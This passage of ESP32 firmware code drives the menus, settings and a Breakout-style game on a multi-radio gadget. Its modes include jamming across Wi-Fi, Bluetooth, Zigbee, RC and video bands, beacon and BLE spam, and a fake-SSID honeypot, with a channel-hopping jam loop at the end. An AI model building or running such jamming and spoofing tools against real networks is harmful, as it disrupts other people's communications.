      bwBallX + BW_BALL_SIZE >= bwPaddleX && bwBallX <= bwPaddleX + BW_PADDLE_W) {
    bwBallVY = -bwBallVY;
    float hitPos = (bwBallX - bwPaddleX) / BW_PADDLE_W;
    bwBallVX = (hitPos - 0.5f) * 2.5f;
    if (bwBallVX > -0.2f && bwBallVX < 0.2f) bwBallVX = 0.3f;
  }

  if (bwBallY < BW_BRICK_AREA_TOP + BW_BRICK_ROWS * BW_BRICK_ROW_PITCH) {
    int brickColPitch = SCREEN_W / BW_BRICK_COLS;
    int col = (int)((bwBallX + BW_BALL_SIZE / 2) / brickColPitch);
    int row = (int)((bwBallY - BW_BRICK_AREA_TOP) / BW_BRICK_ROW_PITCH);
    if (row >= 0 && row < BW_BRICK_ROWS && col >= 0 && col < BW_BRICK_COLS && bwBrickAlive[row][col]) {
      bwBrickAlive[row][col] = false;
      bwBallVY = -bwBallVY;
      bwScore += 10;
    }
  }

  if (bwBallY > SCREEN_H) {
    bwLives--;
    if (bwLives <= 0) {
      brickwiseState = BW_GAME_OVER;
    } else {
      bwBallX = SCREEN_W / 2.0f;
      bwBallY = BW_PADDLE_Y - 4;
      float speed = 0.8f + (bwLevel - 1) * 0.15f;
      bwBallVX = speed;
      bwBallVY = -speed;
    }
  }

  bool anyLeft = false;
  for (int r = 0; r < BW_BRICK_ROWS && !anyLeft; r++) {
    for (int c = 0; c < BW_BRICK_COLS; c++) {
      if (bwBrickAlive[r][c]) { anyLeft = true; break; }
    }
  }
  if (!anyLeft && brickwiseState == BW_PLAYING) {
    bwLevel++;
    bwSetupLevel();
  }
}

static void bwRenderPlaying() {
  u8g2.clearBuffer();
  u8g2.setFont(FONT_SMALL);
  char hud[32];
  snprintf(hud, sizeof(hud), "S:%d L:%d Lv:%d", bwScore, bwLives, bwLevel);
  u8g2.setCursor(1, 0);
  u8g2.print(hud);
  u8g2.drawHLine(0, 9, SCREEN_W);

  int brickColPitch = SCREEN_W / BW_BRICK_COLS;
  int brickW = brickColPitch - 1;
  for (int r = 0; r < BW_BRICK_ROWS; r++) {
    for (int c = 0; c < BW_BRICK_COLS; c++) {
      if (bwBrickAlive[r][c]) {
        u8g2.drawBox(c * brickColPitch, BW_BRICK_AREA_TOP + r * BW_BRICK_ROW_PITCH, brickW, BW_BRICK_H);
      }
    }
  }

  u8g2.drawBox((int)bwPaddleX, BW_PADDLE_Y, BW_PADDLE_W, BW_PADDLE_H);
  u8g2.drawBox((int)bwBallX, (int)bwBallY, BW_BALL_SIZE, BW_BALL_SIZE);

  u8g2.sendBuffer();
}

static void bwRenderGameOver() {
  u8g2.clearBuffer();
  u8g2.setFont(FONT_MEDIUM);
  const char* title = "GAME OVER";
  u8g2.setCursor((SCREEN_W - u8g2.getStrWidth(title)) / 2, 20);
  u8g2.print(title);
  u8g2.setFont(FONT_SMALL);
  char line[24];
  snprintf(line, sizeof(line), "Score: %d", bwScore);
  u8g2.setCursor((SCREEN_W - u8g2.getStrWidth(line)) / 2, 36);
  u8g2.print(line);
  const char* exitTxt = "Click to exit";
  u8g2.setCursor((SCREEN_W - u8g2.getStrWidth(exitTxt)) / 2, 50);
  u8g2.print(exitTxt);
  u8g2.sendBuffer();
}

static void drawPillOutline(int x,int y,int w,int h){
  if (h & 1) h--; if (y & 1) y--;
  u8g2.drawRFrame(x, y, w, h, h/2);
}
static void drawPillKnob(int x,int y,int w,int h,float pos){
  if (h & 1) h--; if (y & 1) y--;
  int r=h/2, cxL=x+r, cxR=x+w-r-1, cy=y+r;
  int cx=(int)lroundf(cxL + (cxR - cxL)*pos);
  int knob = max(2, r-3);
  u8g2.drawDisc(cx, cy, knob);
}
static void drawPillToggle(int x,int y,int w,int h,bool on){
  drawPillOutline(x,y,w,h);
  drawPillKnob(x,y,w,h, on?0.0f:1.0f);
}

static void drawPaginationDots(int active){
  MenuCategory cat = categoryOfMode(modeFromMenuIndex(active));
  int firstIdx = firstMenuIndexInCategory(cat);
  int lastIdx  = lastMenuIndexInCategory(cat);
  int visibleCount = lastIdx - firstIdx + 1;
  if (visibleCount <= 0) return;

  int pitch = 6;
  int radius = 2;

  int totalW = (visibleCount - 1) * pitch;
  int startX = (128 - totalW) / 2;
  for (int i = firstIdx; i <= lastIdx; i++) {
    int pos = i - firstIdx;
    int x = startX + pos * pitch;
    if (i == active) u8g2.drawDisc(x, DOT_Y, radius);
    else              u8g2.drawCircle(x, DOT_Y, radius);
  }
}

static void drawCategoryDots(MenuCategory active) {
  int visibleCount = 0;
  int activePos = 0;
  for (int i = 0; i < CATEGORY_COUNT; i++) {
    if (isCategoryHidden((MenuCategory)i)) continue;
    if ((MenuCategory)i == active) activePos = visibleCount;
    visibleCount++;
  }
  if (visibleCount <= 0) return;

  const int pitch = 14, radius = 3;
  int totalW = (visibleCount - 1) * pitch;
  int startX = (128 - totalW) / 2;
  int pos = 0;
  for (int i = 0; i < CATEGORY_COUNT; i++) {
    if (isCategoryHidden((MenuCategory)i)) continue;
    int x = startX + pos * pitch;
    if (pos == activePos) u8g2.drawDisc(x, DOT_Y, radius);
    else                   u8g2.drawCircle(x, DOT_Y, radius);
    pos++;
  }
}

static bool resolveCategoryIcon(OperationMode mode, const uint8_t** font, char* glyph) {
  if (mode == BLE_MODULE || mode == Bluetooth_MODULE) {
    *font = u8g2_font_open_iconic_embedded_2x_t; *glyph = 'J';
  } else if (isDisruptiveMode(mode)) {
    *font = u8g2_font_open_iconic_embedded_2x_t; *glyph = 'P';
  } else if (isScannerMode(mode) || mode == SPY_LOCATE_MODULE || mode == TRAFFIC_MON_MODULE) {
    *font = u8g2_font_open_iconic_thing_2x_t; *glyph = 'J';
  } else if (mode == BLE_SPECTRUM_MODULE || mode == WIFI_SPECTRUM_MODULE || mode == SPECTRUM_AIO_MODULE) {
    *font = u8g2_font_open_iconic_embedded_2x_t; *glyph = 'F';
  } else if (isInfoMode(mode)) {
    *font = u8g2_font_open_iconic_embedded_2x_t; *glyph = 'B';
  } else if (isBrickwiseMode(mode)) {
    *font = u8g2_font_open_iconic_thing_2x_t; *glyph = 'F';
  } else {
    return false;
  }
  return true;
}

static void drawCategoryIcon(int rightX, int topY, OperationMode mode) {
  const uint8_t* font;
  char glyph;
  if (!resolveCategoryIcon(mode, &font, &glyph)) return;
  u8g2.setFont(font);
  char s[2] = { glyph, 0 };
  int gw = u8g2.getStrWidth(s);
  u8g2.setCursor(rightX - gw, topY);
  u8g2.print(glyph);
}

static void drawCategoryIconCentered(int centerX, int topY, OperationMode mode) {
  const uint8_t* font;
  char glyph;
  if (!resolveCategoryIcon(mode, &font, &glyph)) return;
  u8g2.setFont(font);
  char s[2] = { glyph, 0 };
  int gw = u8g2.getStrWidth(s);
  u8g2.setCursor(centerX - gw / 2, topY);
  u8g2.print(glyph);
}

static void drawCardAtCenter(int centerX, int menuIndex){
  const char* label = kMenuLabels[menuIndex];
  const int W = 128;
  const int w = W - CARD_PAD*2;
  const int x = centerX - w/2;
  const int y = HEADER_H + 4;
  u8g2.setDrawColor(0);
  u8g2.drawBox(x+1, y+1, w-2, CARD_H-2);
  u8g2.setDrawColor(1);
  u8g2.drawRFrame(x, y, w, CARD_H, RADIUS);
  OperationMode mode = modeFromMenuIndex(menuIndex);
  u8g2.setFont(FONT_MEDIUM);
  if (isBrickwiseMode(mode)) {
    int labelW = u8g2.getStrWidth(label);
    u8g2.setCursor(x + (w - labelW) / 2, y + 4);
    u8g2.print(label);
    u8g2.setFont(FONT_SMALL);
    const char* startTxt = "Push Start";
    int startW = u8g2.getStrWidth(startTxt);
    u8g2.setCursor(x + (w - startW) / 2, y + 26);
    u8g2.print(startTxt);
    drawCategoryIcon(x + w - 4, y + 2, mode);
    return;
  }
  if (mode == HONEYPOT_MODULE) {
    int labelW = u8g2.getStrWidth(label);
    u8g2.setCursor(x + (w - labelW) / 2, y + 4);
    u8g2.print(label);
    u8g2.setFont(FONT_SMALL);
    const char* startTxt = "Push Config";
    int startW = u8g2.getStrWidth(startTxt);
    u8g2.setCursor(x + (w - startW) / 2, y + 26);
    u8g2.print(startTxt);
    drawCategoryIcon(x + w - 4, y + 2, mode);
    return;
  }
  u8g2.setCursor(x + 12, y + 4);
  u8g2.print(label);
  bool isThisFocus = (mode == current_Mode);
  bool isActive    = isThisFocus && (isInfoMode(mode) ? (infoState != INFO_IDLE) : (current == ACTIVE_MODE));
  const char* status = isActive ? "ACTIVE" : "DEACTIVE";
  u8g2.setFont(FONT_SMALL);
  u8g2.setCursor(x + 12, y + 28);
  u8g2.print(status);
  drawCategoryIcon(x + w - 4, y + 2, mode);
  bool isOn = isActive;
  const int pillW=24, pillH=14;
  const int pillY=((y + ((CARD_CONTENT_H-pillH)/2)) & ~1) + 13;
  drawPillToggle(x + w - pillW - 10, pillY, pillW, pillH, isOn);
}

static void renderStaticMenu(int focusIndex) {
  u8g2.clearBuffer();
  drawHeaderBar();
  drawCardAtCenter(128 / 2, focusIndex);
  drawPaginationDots(focusIndex);
  u8g2.sendBuffer();
}

static void renderMasterMenu(MenuCategory cat) {
  u8g2.clearBuffer();
  drawHeaderBar();

  const int W = 128;
  const int w = W - CARD_PAD * 2;
  const int x = W / 2 - w / 2;
  const int y = HEADER_H + 4;
  u8g2.drawRFrame(x, y, w, CARD_H, RADIUS);

  u8g2.setFont(FONT_MEDIUM);
  const char* name = kCategoryNames[cat];
  int nw = u8g2.getStrWidth(name);
  u8g2.setCursor(x + (w - nw) / 2, y + 2);
  u8g2.print(name);

  OperationMode repMode = modeFromMenuIndex(firstMenuIndexInCategory(cat));
  drawCategoryIconCentered(x + w / 2, y + 11, repMode);

  int count = lastMenuIndexInCategory(cat) - firstMenuIndexInCategory(cat) + 1;
  u8g2.setFont(FONT_SMALL);
  char sub[16];
  snprintf(sub, sizeof(sub), "%d pages", count);
  int sw = u8g2.getStrWidth(sub);
  u8g2.setCursor(x + (w - sw) / 2, y + 29);
  u8g2.print(sub);

  drawCategoryDots(cat);
  u8g2.sendBuffer();
}

static void animateToMenu(int fromIdx, int toIdx) {
  const int W = 128;
  const int STEPS = 14;
  const uint8_t DT = 10;
  const int dir = (toIdx > fromIdx) ? 1 : -1;
  for (int s = 0; s <= STEPS; s++) {
    float t = (float)s / (float)STEPS;
    float e = (t < 0.5f) ? 4.0f*t*t*t : 1.0f - powf(-2.0f*t + 2.0f, 3)/2.0f;
    int shift = (int)(e * W + 0.5f);
    int centerFrom = (W/2) + (-dir * shift);
    int centerTo   = (W/2) + ( dir * (W - shift));
    u8g2.clearBuffer();
    drawHeaderBar();
    drawCardAtCenter(centerFrom, fromIdx);
    drawCardAtCenter(centerTo,   toIdx);
    drawPaginationDots(toIdx);
    u8g2.sendBuffer();
    delay(DT);
  }
  renderStaticMenu(toIdx);
}

static void animateToggleKnobForFocus(int focusIdx, bool fromActive, bool toActive){
  float start = (fromActive ? 0.0f : 1.0f);
  float end   = (toActive   ? 0.0f : 1.0f);
  const int STEPS = 10;
  const uint8_t FRAME_MS = 12;
  for (int s=0; s<=STEPS; s++){
    float t = (float)s / (float)STEPS;
    float e = (t < 0.5f) ? 2.0f*t*t : 1.0f - powf(-2.0f*t + 2.0f, 2)/2.0f;
    float p = start + (end - start) * e;
    u8g2.clearBuffer();
    drawHeaderBar();
    const int W = 128;
    const int w = W - CARD_PAD*2;
    const int x = W/2 - w/2;
    const int y = HEADER_H + 4;
    u8g2.setDrawColor(0);
    u8g2.drawBox(x+1, y+1, w-2, CARD_H-2);
    u8g2.setDrawColor(1);
    u8g2.drawRFrame(x, y, w, CARD_H, RADIUS);
    u8g2.setFont(FONT_MEDIUM); u8g2.setCursor(x+12, y+4);  u8g2.print(kMenuLabels[focusIdx]);
    u8g2.setFont(FONT_SMALL);  u8g2.setCursor(x+12, y+28); u8g2.print("----");
    const int pillW=24, pillH=14;
    const int pillY=((y + ((CARD_CONTENT_H-pillH)/2)) & ~1) + 13;
    const int pillX=x + w - pillW - 10;
    drawPillOutline(pillX, pillY, pillW, pillH);
    drawPillKnob(pillX, pillY, pillW, pillH, p);
    drawPaginationDots(focusIdx);
    u8g2.sendBuffer();
    delay(FRAME_MS);
  }
  renderStaticMenu(focusIdx);
}

void update_OLED() {
  int focus = menuIndexFromMode(current_Mode);
  renderStaticMenu(focus);
}

void menuPrev() {
  int fromIdx = menuIndexFromMode(current_Mode);
  int toIdx   = (fromIdx == 0) ? (kMenuCount - 1) : (fromIdx - 1);
  current_Mode = modeFromMenuIndex(toIdx);
  animateToMenu(fromIdx, toIdx);
}
void menuNext() {
  int fromIdx = menuIndexFromMode(current_Mode);
  int toIdx   = (fromIdx == (kMenuCount - 1)) ? 0 : (fromIdx + 1);
  current_Mode = modeFromMenuIndex(toIdx);
  animateToMenu(fromIdx, toIdx);
}
void menuToggleActive() {
  int focus = menuIndexFromMode(current_Mode);
  bool wasActive = (current == ACTIVE_MODE);
  current = wasActive ? DEACTIVE_MODE : ACTIVE_MODE;
  animateToggleKnobForFocus(focus, wasActive, !wasActive);
}

static OperationMode nextVisibleMode(int direction) {
  int idx = menuIndexFromMode(current_Mode);
  for (int step = 0; step < kMenuCount; step++) {
    idx = (idx + direction + kMenuCount) % kMenuCount;
    if (deviceMode != MODE_SCAN_ONLY || !isDisruptiveMode(modeFromMenuIndex(idx))) {
      break;
    }
  }
  return modeFromMenuIndex(idx);
}

bool checkMode() {
  if (navLevel == NAV_CATEGORY) {
    if (ChangeRequested) {
      ChangeRequested = false;
      currentCategory = nextVisibleCategory(currentCategory, -1);
      renderMasterMenu(currentCategory);
      return true;
    }
    if (ChangeRequested1) {
      ChangeRequested1 = false;
      currentCategory = nextVisibleCategory(currentCategory, +1);
      renderMasterMenu(currentCategory);
      return true;
    }
    if (ChangeRequested2) {
      ChangeRequested2 = false;
      navLevel = NAV_CARD;
      current_Mode = modeFromMenuIndex(firstMenuIndexInCategory(currentCategory));
      update_OLED();
      return true;
    }
    return false;
  }

  bool browsingScanPages  = (current == ACTIVE_MODE) && isScannerMode(current_Mode);
  bool browsingSpectrumAio = (current == ACTIVE_MODE) && (current_Mode == SPECTRUM_AIO_MODULE);
  bool browsingLocate = (current == ACTIVE_MODE) && (current_Mode == SPY_LOCATE_MODULE);
  bool browsingTrafficMon = (current == ACTIVE_MODE) && (current_Mode == TRAFFIC_MON_MODULE);
  bool browsingHoneypot = (current == ACTIVE_MODE) && (current_Mode == HONEYPOT_MODULE);
  bool editingHoneypotSsid = honeypotEditingSsid;
  bool configuringHoneypot = honeypotConfigOpen && !honeypotEditingSsid;
  bool browsingInfoScreens = (current_Mode == INFO_MODULE) && (infoState != INFO_IDLE) && !infoEditing;
  bool editingBrightness  = (current_Mode == INFO_MODULE) && (infoState == INFO_BRIGHTNESS)  && infoEditing;
  bool editingDeviceMode  = (current_Mode == INFO_MODULE) && (infoState == INFO_DEVICE_MODE) && infoEditing;
  bool playingBrickwise   = (current_Mode == BRICKWISE_MODULE) && (brickwiseState != BW_IDLE);

  if (ChangeRequested) {
    ChangeRequested = false;
    if (browsingScanPages) {
      if (current_Mode == WIFI_SCANNER_MODULE) {
        wifiScanPage = (wifiScanPage == 0) ? (wifiScanTotalPages() - 1) : (wifiScanPage - 1);
        renderWifiScanResults(wifiScanPage);
      } else if (current_Mode == BT_SCANNER_MODULE) {
        btScanPage = (btScanPage == 0) ? (btScanTotalPages() - 1) : (btScanPage - 1);
        renderBtScanResults(btScanPage);
      } else if (current_Mode == PROBE_SNIFFER_MODULE) {
        probeScanPage = (probeScanPage == 0) ? (probeSniffTotalPages() - 1) : (probeScanPage - 1);
        renderProbeSniffResults(probeScanPage);
      } else {
        bleScanPage = (bleScanPage == 0) ? (bleScanTotalPages() - 1) : (bleScanPage - 1);
        renderBleScanResults(bleScanPage);
      }
      return true;
    } else if (browsingSpectrumAio) {
      spectrumAioFilter = (SpectrumFilter)((spectrumAioFilter - 1 + SPEC_FILTER_COUNT) % SPEC_FILTER_COUNT);
      renderSpectrumAioFrame();
      return true;
    } else if (browsingLocate) {
      locateChannel = (locateChannel <= 0) ? 125 : (locateChannel - 1);
      renderSpyLocateFrame();
      return true;
    } else if (browsingTrafficMon) {
      trafficChannel = (trafficChannel <= 1) ? 13 : (trafficChannel - 1);
      esp_wifi_set_channel(trafficChannel, WIFI_SECOND_CHAN_NONE);
      renderTrafficMonFrame();
      return true;
    } else if (browsingHoneypot) {
      honeypotPage = (honeypotPage == 0) ? (honeypotTotalPages() - 1) : (honeypotPage - 1);
      renderHoneypotHistory(honeypotPage);
      return true;
    } else if (editingHoneypotSsid) {
      honeypotEditCharIdx = (honeypotEditCharIdx == 0) ? (HONEYPOT_EDIT_TOTAL - 1) : (honeypotEditCharIdx - 1);
      renderHoneypotSsidEditor();
      return true;
    } else if (configuringHoneypot) {
      int total = honeypotConfigTotal();
      honeypotSsidPresetIdx = (honeypotSsidPresetIdx == 0) ? (total - 1) : (honeypotSsidPresetIdx - 1);
      renderHoneypotConfig();
      return true;
    } else if (browsingInfoScreens) {
      infoState = nextInfoScreen(infoState, -1);
      renderInfoScreen(infoState);
      return true;
    } else if (editingBrightness) {
      oledBrightness = (oledBrightness < BRIGHTNESS_STEP) ? 0 : (oledBrightness - BRIGHTNESS_STEP);
      renderInfoBrightness();
      EEPROM.write(1, oledBrightness);
      EEPROM.write(2, 0xA5);
      EEPROM.commit();
      return true;
    } else if (editingDeviceMode) {
      deviceMode = (deviceMode == MODE_JAM_SCAN) ? MODE_SCAN_ONLY : MODE_JAM_SCAN;
      if (deviceMode == MODE_SCAN_ONLY) {
        current = DEACTIVE_MODE;
        setRadiosNeutralState();
        if (isDisruptiveMode(current_Mode)) current_Mode = nextVisibleMode(+1);
        if (isCategoryHidden(currentCategory)) currentCategory = nextVisibleCategory(currentCategory, +1);
      }
      renderInfoDeviceMode();
      EEPROM.write(3, deviceMode == MODE_SCAN_ONLY ? 1 : 0);
      EEPROM.commit();
      return true;
    } else if (playingBrickwise) {
      return true;
    } else {
      int fromIdx = menuIndexFromMode(current_Mode);
      MenuCategory cat = categoryOfMode(current_Mode);
      bool atBoundary = (fromIdx == firstMenuIndexInCategory(cat));
      if (atBoundary && current == ACTIVE_MODE) {
        current = DEACTIVE_MODE;
        return false;
      }
      if (atBoundary) {
        navLevel = NAV_CATEGORY;
        currentCategory = cat;
        renderMasterMenu(currentCategory);
        return true;
      }
      current_Mode = modeFromMenuIndex(fromIdx - 1);
      infoState     = INFO_IDLE;
      infoEditing   = false;
      brickwiseState = BW_IDLE;
      wifiScanPage = 0; btScanPage = 0; bleScanPage = 0; probeScanPage = 0; honeypotPage = 0;
      spectrumAioFilter = SPEC_FILTER_ALL;
    }
  } else if (ChangeRequested1) {
    ChangeRequested1 = false;
    if (browsingScanPages) {
      if (current_Mode == WIFI_SCANNER_MODULE) {
        wifiScanPage = (wifiScanPage + 1) % wifiScanTotalPages();
        renderWifiScanResults(wifiScanPage);
      } else if (current_Mode == BT_SCANNER_MODULE) {
        btScanPage = (btScanPage + 1) % btScanTotalPages();
        renderBtScanResults(btScanPage);
      } else if (current_Mode == PROBE_SNIFFER_MODULE) {
        probeScanPage = (probeScanPage + 1) % probeSniffTotalPages();
        renderProbeSniffResults(probeScanPage);
      } else {
        bleScanPage = (bleScanPage + 1) % bleScanTotalPages();
        renderBleScanResults(bleScanPage);
      }
      return true;
    } else if (browsingSpectrumAio) {
      spectrumAioFilter = (SpectrumFilter)((spectrumAioFilter + 1) % SPEC_FILTER_COUNT);
      renderSpectrumAioFrame();
      return true;
    } else if (browsingLocate) {
      locateChannel = (locateChannel >= 125) ? 0 : (locateChannel + 1);
      renderSpyLocateFrame();
      return true;
    } else if (browsingTrafficMon) {
      trafficChannel = (trafficChannel >= 13) ? 1 : (trafficChannel + 1);
      esp_wifi_set_channel(trafficChannel, WIFI_SECOND_CHAN_NONE);
      renderTrafficMonFrame();
      return true;
    } else if (browsingHoneypot) {
      honeypotPage = (honeypotPage + 1) % honeypotTotalPages();
      renderHoneypotHistory(honeypotPage);
      return true;
    } else if (editingHoneypotSsid) {
      honeypotEditCharIdx = (honeypotEditCharIdx + 1) % HONEYPOT_EDIT_TOTAL;
      renderHoneypotSsidEditor();
      return true;
    } else if (configuringHoneypot) {
      honeypotSsidPresetIdx = (honeypotSsidPresetIdx + 1) % honeypotConfigTotal();
      renderHoneypotConfig();
      return true;
    } else if (browsingInfoScreens) {
      infoState = nextInfoScreen(infoState, +1);
      renderInfoScreen(infoState);
      return true;
    } else if (editingBrightness) {
      oledBrightness = (oledBrightness > 255 - BRIGHTNESS_STEP) ? 255 : (oledBrightness + BRIGHTNESS_STEP);
      renderInfoBrightness();
      EEPROM.write(1, oledBrightness);
      EEPROM.write(2, 0xA5);
      EEPROM.commit();
      return true;
    } else if (editingDeviceMode) {
      deviceMode = (deviceMode == MODE_JAM_SCAN) ? MODE_SCAN_ONLY : MODE_JAM_SCAN;
      if (deviceMode == MODE_SCAN_ONLY) {
        current = DEACTIVE_MODE;
        setRadiosNeutralState();
        if (isDisruptiveMode(current_Mode)) current_Mode = nextVisibleMode(+1);
        if (isCategoryHidden(currentCategory)) currentCategory = nextVisibleCategory(currentCategory, +1);
      }
      renderInfoDeviceMode();
      EEPROM.write(3, deviceMode == MODE_SCAN_ONLY ? 1 : 0);
      EEPROM.commit();
      return true;
    } else if (playingBrickwise) {
      return true;
    } else {
      int fromIdx = menuIndexFromMode(current_Mode);
      MenuCategory cat = categoryOfMode(current_Mode);
      if (fromIdx == lastMenuIndexInCategory(cat)) {
        return true; // last card of the submenu: right does nothing
      }
      current_Mode = modeFromMenuIndex(fromIdx + 1);
      infoState     = INFO_IDLE;
      infoEditing   = false;
      brickwiseState = BW_IDLE;
      wifiScanPage = 0; btScanPage = 0; bleScanPage = 0; probeScanPage = 0; honeypotPage = 0;
      spectrumAioFilter = SPEC_FILTER_ALL;
    }
  } else if (ChangeRequested2) {
    ChangeRequested2 = false;
    if (current_Mode == INFO_MODULE) {
      if (infoState == INFO_IDLE) {
        infoState = INFO_RADIOS;
        renderInfoRadios();
      } else if (infoEditing) {
        infoEditing = false;
        renderInfoScreen(infoState);
      } else if (infoState == INFO_BRIGHTNESS || infoState == INFO_DEVICE_MODE) {
        infoEditing = true;
        renderInfoScreen(infoState);
      } else {
        infoState = INFO_IDLE;
        update_OLED();
      }
    } else if (current_Mode == BRICKWISE_MODULE) {
      if (brickwiseState == BW_IDLE) {
        bwStartGame();
        bwRenderPlaying();
      } else {
        brickwiseState = BW_IDLE;
        update_OLED();
      }
    } else if (honeypotEditingSsid) {
      if (honeypotEditCharIdx == HONEYPOT_EDIT_META_DEL) {
        if (honeypotEditLen > 0) honeypotEditLen--;
        renderHoneypotSsidEditor();
      } else if (honeypotEditCharIdx == HONEYPOT_EDIT_META_DONE) {
        if (honeypotEditLen > 0) {
          honeypotCustomSsid[honeypotEditLen] = '\0';
          honeypotEditingSsid = false;
          honeypotConfigOpen = false;
          honeypotSsidPresetIdx = HONEYPOT_PRESET_COUNT;
          if (!(isDisruptiveMode(current_Mode) && deviceMode == MODE_SCAN_ONLY)) {
            current = ACTIVE_MODE;
          } else {
            update_OLED();
          }
        }
      } else if (honeypotEditLen < (int)sizeof(honeypotCustomSsid) - 1) {
        honeypotCustomSsid[honeypotEditLen++] = kHoneypotEditCharset[honeypotEditCharIdx];
        renderHoneypotSsidEditor();
      }
    } else if (honeypotConfigOpen) {
      int customIdx = HONEYPOT_PRESET_COUNT;
      int cancelIdx = HONEYPOT_PRESET_COUNT + 1;
      if (honeypotSsidPresetIdx == cancelIdx) {
        honeypotConfigOpen = false;
        update_OLED();
      } else if (honeypotSsidPresetIdx == customIdx) {
        honeypotEditingSsid = true;
        honeypotEditLen = 0;
        honeypotEditCharIdx = 0;
        renderHoneypotSsidEditor();
      } else {
        honeypotConfigOpen = false;
        if (!(isDisruptiveMode(current_Mode) && deviceMode == MODE_SCAN_ONLY)) {
          current = ACTIVE_MODE;
        } else {
          update_OLED();
        }
      }
    } else if (current_Mode == HONEYPOT_MODULE && current == DEACTIVE_MODE) {
      if (!(isDisruptiveMode(current_Mode) && deviceMode == MODE_SCAN_ONLY)) {
        honeypotConfigOpen = true;
        renderHoneypotConfig();
      }
    } else if (!(isDisruptiveMode(current_Mode) && deviceMode == MODE_SCAN_ONLY)) {
      bool wasActive = (current == ACTIVE_MODE);
      current = wasActive ? DEACTIVE_MODE : ACTIVE_MODE;
    }
  }
  return false;
}

void setup() {
  Serial.begin(115200);
  EEPROM.begin(512);
  deviceMode = (EEPROM.read(3) == 1) ? MODE_SCAN_ONLY : MODE_JAM_SCAN;
  initialize_MultiMode();
  Wire.begin();
  Wire.setClock(400000);
  u8g2.begin();
  u8g2.setBusClock(400000);
  u8g2.setFont(FONT_SMALL);
  u8g2.setDrawColor(1);
  u8g2.setFontPosTop();
  neopixelSetup();
  u8g2.setContrast(oledBrightness);
  if (deviceMode == MODE_SCAN_ONLY && isDisruptiveMode(current_Mode)) {
    current_Mode = nextVisibleMode(+1);
  }
  if (isCategoryHidden(currentCategory)) {
    currentCategory = nextVisibleCategory(currentCategory, +1);
  }
  esp_bt_controller_deinit();
  esp_wifi_stop();
  esp_wifi_deinit();
  esp_wifi_disconnect();
  pinMode(PIN_BTN_L,  INPUT_PULLUP);
  pinMode(PIN_BTN_R, INPUT_PULLUP);
  pinMode(PIN_BTN_S, INPUT_PULLUP);
  attachInterrupt(digitalPinToInterrupt(PIN_BTN_L),  handleButton,  FALLING);
  attachInterrupt(digitalPinToInterrupt(PIN_BTN_R), handleButton1, FALLING);
  attachInterrupt(digitalPinToInterrupt(PIN_BTN_S), handleButton2, FALLING);
  initialize_Radios();
  calibrateCpuLoad();
  conf();
  renderMasterMenu(currentCategory);
}

void loop() {
#if ICON_BROWSER_MODE
  runIconBrowser();
  return;
#endif
  bool skipPeriodicRefresh = checkMode();
  static Operation     lastActivity = current;
  static OperationMode lastFocus    = current_Mode;
  if (current_Mode != lastFocus) {
    if (isDisruptiveMode(lastFocus) && !isDisruptiveMode(current_Mode) && current == ACTIVE_MODE) {
      current = DEACTIVE_MODE;
      setRadiosNeutralState();
      lastActivity = current;
    }
    if (isDisruptiveMode(current_Mode)) {
      setActivityPixel(100, current == ACTIVE_MODE);
    } else {
      setActivityPixel(0, false);
    }
    int fromIdx = menuIndexFromMode(lastFocus);
    int toIdx   = menuIndexFromMode(current_Mode);
    animateToMenu(fromIdx, toIdx);
    lastFocus = current_Mode;
    return;
  }
  if (current != lastActivity) {
    if (current == DEACTIVE_MODE) {
      setActivityPixel(0, false);
      initialize_Radios();
      if (current_Mode == PROBE_SNIFFER_MODULE) stopProbeSniff();
      if (current_Mode == TRAFFIC_MON_MODULE) stopTrafficMon();
      if (current_Mode == HONEYPOT_MODULE) stopHoneypot();
    } else if (current_Mode == PROBE_SNIFFER_MODULE) {
      startProbeSniff();
    } else if (current_Mode == TRAFFIC_MON_MODULE) {
      startTrafficMon();
      renderTrafficMonFrame();
    } else if (current_Mode == HONEYPOT_MODULE) {
      setActivityPixel(100, true);
      startHoneypot();
      renderHoneypotHistory(honeypotPage);
    } else if (current_Mode == BEACON_SPAM_MODULE) {
      setActivityPixel(100, true);
      beaconSpamCount = 0;
      renderBeaconSpamFrame();
    } else if (current_Mode == BLE_SPAM_MODULE) {
      setActivityPixel(100, true);
      bleSpamCount = 0;
      renderBleSpamFrame();
    } else if (isJammerMode(current_Mode)) {
      setActivityPixel(100, true);
      initialize_Radios();
    } else if (current_Mode == BLE_SPECTRUM_MODULE || current_Mode == WIFI_SPECTRUM_MODULE || current_Mode == SPECTRUM_AIO_MODULE || current_Mode == SPY_LOCATE_MODULE) {
      RadioA.stopConstCarrier();
    }
    int  focus     = menuIndexFromMode(current_Mode);
    bool wasActive = (lastActivity == ACTIVE_MODE);
    bool nowActive = (current      == ACTIVE_MODE);
    animateToggleKnobForFocus(focus, wasActive, nowActive);
    lastActivity = current;
    return;
  }
  if (skipPeriodicRefresh) {
    return;
  }
    if (current_Mode == BLE_MODULE) {
      int randomIndex = random(0, sizeof(ble_channels) / sizeof(ble_channels[0]));
      byte channel = ble_channels[randomIndex];
      RadioA.setChannel(channel);
      RadioB.setChannel(channel);
      RadioC.setChannel(channel);
    } else if (current_Mode == Bluetooth_MODULE) {
      int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
      byte channel = bluetooth_channels[randomIndex];
      RadioA.setChannel(channel);
      RadioB.setChannel(channel);
      RadioC.setChannel(channel);
    } else if (current_Mode == WiFi_MODULE) {
      int randomIndex = random(0, sizeof(WiFi_channels) / sizeof(WiFi_channels[0]));
      byte channel = WiFi_channels[randomIndex];
      RadioA.setChannel(channel);
      RadioB.setChannel(channel);
      RadioC.setChannel(channel);
    } else if (current_Mode == USB_WIRELESS_MODULE) {
      int randomIndex = random(0, sizeof(usbWireless_channels) / sizeof(usbWireless_channels[0]));
      byte channel = usbWireless_channels[randomIndex];
      RadioA.setChannel(channel);
      RadioB.setChannel(channel);
      RadioC.setChannel(channel);
    } else if (current_Mode == VIDEO_TX_MODULE) {
      int randomIndex = random(0, sizeof(videoTransmitter_channels) / sizeof(videoTransmitter_channels[0]));
      byte channel = videoTransmitter_channels[randomIndex];
      RadioA.setChannel(channel);
      RadioB.setChannel(channel);
      RadioC.setChannel(channel);
    } else if (current_Mode == RC_MODULE) {
      int randomIndex = random(0, sizeof(rc_channels) / sizeof(rc_channels[0]));
      byte channel = rc_channels[randomIndex];
      RadioA.setChannel(channel);
      RadioB.setChannel(channel);
      RadioC.setChannel(channel);
    } else if (current_Mode == ZIGBEE_MODULE) {
      int randomIndex = random(0, sizeof(zigbee_channels) / sizeof(zigbee_channels[0]));
      byte channel = zigbee_channels[randomIndex];
